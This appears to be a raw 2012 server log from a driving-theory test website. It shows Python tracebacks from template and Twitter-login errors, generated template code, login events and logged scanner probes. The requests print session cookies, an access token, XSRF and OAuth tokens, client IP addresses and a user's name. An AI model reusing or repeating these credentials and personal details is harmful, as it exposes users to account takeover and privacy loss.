HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=50631b088e4c852a6d45fc2a&answers=%5B3%5D&cursor=13&_xsrf=92d20564385d4b7d9c53d2545082ff67', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '93', 'Accept-Language': 'en-us,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.2113257321.1348653567.1348661656.1348671688.3; __utmc=188782963; __utmz=188782963.1348653567.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _xsrf=92d20564385d4b7d9c53d2545082ff67; __utmb=188782963.9.10.1348671688; access_token="QUFBRzZsTmNzNkdjQkFJcTNZeHhEMzVmTTZ2TFJlaWpEVndzR2R5UEZrY3NidVVjd29uRTBWVGRyQlRwQ3pFWkNRbjB6aWRDV3NSa0twQmprNjByT2ZaQ21VcThWOEFQd0hQbElWTTF3WkRaRA==|1348671751|90047c3d9ecf209296a1c87c267835c3dfe44991"; user_type="ZmI=|1348671751|d1e294f0b297ccb9c4a11e7f1cd55167fb7ed56c"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 213, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 218, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 115.46ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<img src="')  # base.html:79 (via base.html:56)
36          _tmp = static_url('imgs/fb.png')  # base.html:79 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:79 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:79 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:79 (via base.html:56)
40          _append(_tmp)  # base.html:79 (via base.html:56)
41          _append('" alt="My Image Description" class="align-left frame" /><div class="fb"><div class="fbname"><b>David Mason</b></div><div class="fbpoints"><b><font color="#0589de">217 Points</font></b></div></div>\n')  # base.html:80 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:85 (via base.html:56)
43      _append('\n')  # base.html:87
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:87)
45      test=kwargs['test']  # test/test.html:5 (via base.html:87)
46      _append('\n')  # test/test.html:6 (via base.html:87)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:87)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:87)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:87)
50      _append(_tmp)  # test/test.html:6 (via base.html:87)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:87)
52      _append('\n')  # base.html:91
53      _tmp = xsrf_form_html()  # base.html:91
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
55      else: _tmp = _utf8(str(_tmp))  # base.html:91
56      _append(_tmp)  # base.html:91
57      _append('\n')  # base.html:92
58      _append('\n<script src="')  # base.html:93 (via base.html:92)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:93 (via base.html:92)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:93 (via base.html:92)
61      else: _tmp = _utf8(str(_tmp))  # base.html:93 (via base.html:92)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:93 (via base.html:92)
63      _append(_tmp)  # base.html:93 (via base.html:92)
64      _append('"></script>\n<script src="')  # base.html:94 (via base.html:92)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:94 (via base.html:92)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:92)
67      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:92)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:92)
69      _append(_tmp)  # base.html:94 (via base.html:92)
70      _append('"></script>\n<script src="')  # base.html:95 (via base.html:92)
71      _tmp = static_url('js/IT.js')  # base.html:95 (via base.html:92)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:92)
73      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:92)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:92)
75      _append(_tmp)  # base.html:95 (via base.html:92)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:99 (via base.html:92)
77      _append('\n')  # base.html:101
78      for js in kwargs['js_deps']:  # base.html:101
79          _append('\n<script src="')  # base.html:102
80          _tmp = static_url(js)  # base.html:102
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:102
82          else: _tmp = _utf8(str(_tmp))  # base.html:102
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:102
84          _append(_tmp)  # base.html:102
85          _append('"></script>\n')  # base.html:103
86      _append('\n')  # base.html:105
87      _append('\n')  # test/test.html:11 (via base.html:105)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright"><a href="/landing/about">About Us</a> | <a href="/landing/terms">Terms & Conditions</a> | <a href="/landing/privacy">Privacy Policy</a> | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:117
89      return _utf8('').join(_buffer)  # base.html:0
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8000:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8000:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
Facebook user with id 504e0ce18e4c854a5c9fc2f2 has successfully logged in.
INFO:intheory-8002:Facebook user with id 504e0ce18e4c854a5c9fc2f2 has successfully logged in.
Facebook user with id 5059aa218e4c85480ff4f8bd has successfully logged in.
INFO:intheory-8003:Facebook user with id 5059aa218e4c85480ff4f8bd has successfully logged in.
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (184.106.234.133) 0.82ms
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8001:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
WARNING:root:405 HEAD / (127.0.0.1) 0.68ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (85.116.64.22) 1.45ms
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8001:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (184.106.234.133) 0.78ms
WARNING:root:Missing OAuth request token cookie
WARNING:root:500 GET /login/twitter?oauth_token=stXgJOfnyxnrgyWm5igHBvSvHKqtJ3oFc1bLhQ8GSPk&oauth_verifier=LSkDAbGJ3dPdUEUVvpkogva0gLZjfMszwtvYW6Ob4 (127.0.0.1): Twitter auth failed
ERROR:root:500 GET /login/twitter?oauth_token=stXgJOfnyxnrgyWm5igHBvSvHKqtJ3oFc1bLhQ8GSPk&oauth_verifier=LSkDAbGJ3dPdUEUVvpkogva0gLZjfMszwtvYW6Ob4 (127.0.0.1) 2.57ms
ERROR:root:Uncaught exception GET /login/twitter?oauth_token=oYPYU5Gxp190p4e5F6gRCfGp58lV6xjPVPAQ00RB8&oauth_verifier=dY8ejye4HxZ5TXDbRphGH95OX0HFeKsoz7zZGAm2X0 (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/twitter?oauth_token=oYPYU5Gxp190p4e5F6gRCfGp58lV6xjPVPAQ00RB8&oauth_verifier=dY8ejye4HxZ5TXDbRphGH95OX0HFeKsoz7zZGAm2X0', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; __utma=188782963.1731359073.1348049186.1348664826.1348696776.15; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/; _oauth_request_token="b1lQWVU1R3hwMTkwcDRlNUY2Z1JDZkdwNThsVjZ4alBWUEFRMDBSQjg=|TVczSTFDT3JhYlZ5UlFhdXAxM2ZHZnozV1NzcjZtc0pjMlZRWk4wR0ZZ"', 'X-Real-Ip': '109.158.140.86'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 137, in _on_auth
    self.log.info("Twitter user with id " + c_user.id + " has successfully logged in.")
TypeError: cannot concatenate 'str' and 'ObjectId' objects
ERROR:root:500 GET /login/twitter?oauth_token=oYPYU5Gxp190p4e5F6gRCfGp58lV6xjPVPAQ00RB8&oauth_verifier=dY8ejye4HxZ5TXDbRphGH95OX0HFeKsoz7zZGAm2X0 (127.0.0.1) 715.55ms
ERROR:root:Uncaught exception GET /login/twitter?oauth_token=lTpQDHzPOSKXhjGspiKsTxaPgxpAjCM22lUAlPQppc&oauth_verifier=9MxB70omQC6G0X6xrELtf70gjIs5BVMZpzvZ2AEU (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/twitter?oauth_token=lTpQDHzPOSKXhjGspiKsTxaPgxpAjCM22lUAlPQppc&oauth_verifier=9MxB70omQC6G0X6xrELtf70gjIs5BVMZpzvZ2AEU', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; __utma=188782963.1731359073.1348049186.1348696776.1348746866.16; __utmb=188782963.1.10.1348746866; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/; _oauth_request_token=bFRwUURIelBPU0tYaGpHc3BpS3NUeGFQZ3hwQWpDTTIybFVBbFBRcHBj|aFBneHAwdUZubXJSZlZXQmlMSFNHUjhZUkpBV09rTlpXRkZmUU9BQTlF', 'X-Real-Ip': '109.158.140.86'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 137, in _on_auth
    self.log.info("Twitter user with id " + c_user.id + " has successfully logged in.")
TypeError: cannot concatenate 'str' and 'ObjectId' objects
ERROR:root:500 GET /login/twitter?oauth_token=lTpQDHzPOSKXhjGspiKsTxaPgxpAjCM22lUAlPQppc&oauth_verifier=9MxB70omQC6G0X6xrELtf70gjIs5BVMZpzvZ2AEU (127.0.0.1) 733.00ms
ERROR:root:Uncaught exception GET /login/twitter?oauth_token=Xqg2tP8FxgpmjKV6kxjCetLHHvquJ2NkBMK4eJeaY&oauth_verifier=PaDrzqcI6FRJIGxVWGiZpWs1eoVgtx3gJV0uLYh6Mw (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/twitter?oauth_token=Xqg2tP8FxgpmjKV6kxjCetLHHvquJ2NkBMK4eJeaY&oauth_verifier=PaDrzqcI6FRJIGxVWGiZpWs1eoVgtx3gJV0uLYh6Mw', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; __utma=188782963.1731359073.1348049186.1348696776.1348746866.16; __utmb=188782963.3.10.1348746866; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/; _oauth_request_token="WHFnMnRQOEZ4Z3BtaktWNmt4akNldExISHZxdUoyTmtCTUs0ZUplYVk=|dGRnN1pDN2xEVjNVZmwxOWg1TVpiblRsUDhYYjU5Wno4ZlVZRjJGMEE="', 'X-Real-Ip': '109.158.140.86'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 137, in _on_auth
    self.log.info("Twitter user with id " + c_user.id + " has successfully logged in.")
TypeError: cannot concatenate 'str' and 'ObjectId' objects
ERROR:root:500 GET /login/twitter?oauth_token=Xqg2tP8FxgpmjKV6kxjCetLHHvquJ2NkBMK4eJeaY&oauth_verifier=PaDrzqcI6FRJIGxVWGiZpWs1eoVgtx3gJV0uLYh6Mw (127.0.0.1) 711.34ms
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
INFO:intheory-8000:Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
INFO:intheory-8003:Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
WARNING:root:Missing OAuth request token cookie
WARNING:root:500 GET /login/twitter?oauth_token=ratrJU4UKyLN7KYk68xiZpLBJT3xeFYSy0aqmJ1nBPI&oauth_verifier=uIbheTuv4EKakyx3rZvrcmnAoPmNWAZ7QP4qCeBdME (127.0.0.1): Twitter auth failed
ERROR:root:500 GET /login/twitter?oauth_token=ratrJU4UKyLN7KYk68xiZpLBJT3xeFYSy0aqmJ1nBPI&oauth_verifier=uIbheTuv4EKakyx3rZvrcmnAoPmNWAZ7QP4qCeBdME (127.0.0.1) 1.41ms
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
INFO:intheory-8001:Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
Facebook user with id 504f1b2c8e4c850a47037b89 has successfully logged in.
